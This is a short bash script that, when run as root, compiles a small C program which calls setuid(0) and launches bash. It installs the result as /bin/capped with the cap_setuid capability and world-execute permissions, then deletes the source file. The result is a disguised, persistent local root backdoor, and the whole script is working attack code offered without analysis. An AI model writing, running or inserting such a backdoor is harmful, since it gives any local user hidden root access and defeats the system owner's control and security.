#!/bin/bash

if [ "$UID" -ne 0 ]
  then echo "Please run as root"
  exit
fi

new_shell="/bin/capped"

cat << END >> /tmp/exploit.c
#include <unistd.h>
#include <stdio.h>
int main(void){setuid(0);execl("/bin/bash", "bash", NULL);}
END

gcc /tmp/exploit.c -o $new_shell
setcap "cap_setuid=ep" $new_shell

# this is slightly suspicious but eh
chmod 755 $new_shell

# and clean
rm /tmp/exploit.c
